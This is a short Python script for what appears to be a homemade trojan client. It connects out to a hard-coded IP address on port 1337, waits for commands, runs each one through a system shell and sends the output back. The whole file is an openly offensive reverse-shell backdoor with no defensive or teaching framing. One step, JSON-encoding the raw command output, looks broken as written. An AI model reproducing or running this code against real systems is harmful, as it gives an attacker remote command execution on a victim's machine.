#!/usr/bin/env python3
import json
import socket
import subprocess


class JTClient:
    def __init__(self, ip, port):
        self.c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.c.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.c.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = self.c.recv(1024)
        return json.loads(json_data.decode('utf-8'))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            cmd = self.reliable_receive()
            # cmd = self.c.recv(1024).decode('utf-8')
            cmd_result = self.execute_system_command(cmd)
            # self.c.send(cmd_result)
            self.reliable_send(cmd_result)

        self.c.close()


jTro_client = JTClient("192.168.31.207", 1337)
jTro_client.run()
